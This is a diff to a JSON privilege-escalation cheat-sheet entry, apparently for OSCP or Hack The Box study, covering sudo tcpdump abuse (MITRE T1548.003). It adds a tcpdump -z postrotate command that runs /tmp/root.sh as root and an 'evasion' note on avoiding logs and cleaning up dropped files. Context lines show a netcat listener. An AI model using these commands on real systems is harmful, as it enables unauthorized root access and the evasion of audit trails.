@@ -40,11 +40,11 @@
       "command": "nc -lnvp 443"
     },
     {
-      "label": "OSCP Ch17 \u2014 check AppArmor status (may block sudo escapes)",
+      "label": "OSCP Ch17 — check AppArmor status (may block sudo escapes)",
       "command": "sudo aa-status"
     },
     {
-      "label": "OSCP Ch17 \u2014 check syslog for AppArmor denials if escape fails",
+      "label": "OSCP Ch17 — check syslog for AppArmor denials if escape fails",
       "command": "cat /var/log/syslog | grep tcpdump | grep apparmor"
     }
   ],
@@ -111,6 +111,13 @@
     "sources": [
       "HTB M25",
       "MITRE T1548.003"
-    ]
-  }
+    ],
+    "evasion": "Use the GTFOBins one-shot that spawns a shell without writing files; remove any dropped .so/binary; the sudo call is logged, so do it once and pivot rather than repeating."
+  },
+  "variations": [
+    {
+      "label": "Run a command via -z postrotate",
+      "command": "sudo tcpdump -ln -i eth0 -w /dev/null -W 1 -G 1 -z /tmp/root.sh -Z root"
+    }
+  ]
 }
